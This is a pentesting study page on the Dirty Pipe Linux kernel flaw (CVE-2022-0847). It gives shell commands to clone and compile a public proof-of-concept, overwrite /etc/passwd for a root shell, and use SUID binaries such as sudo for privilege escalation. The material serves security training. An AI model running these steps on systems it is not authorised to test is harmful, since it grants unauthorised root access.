---
title: Dirty Pipe
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Dirty Pipe

A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux.

Technically, the vulnerability is similar to the [Dirty Cow](dirty-cow.md) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

In a nugshell: this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

Downloading a POC: [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

```shell-session
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```


After compiling the code, we have two different exploits available:

- The first exploit version (exploit-1) modifies the /etc/passwd and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit:

```shell-session
uname -r

./exploit-1
```

- With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

```shell-session
 find / -perm -4000 2>/dev/null
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

```shell-session
./exploit-2 /usr/bin/sudo
```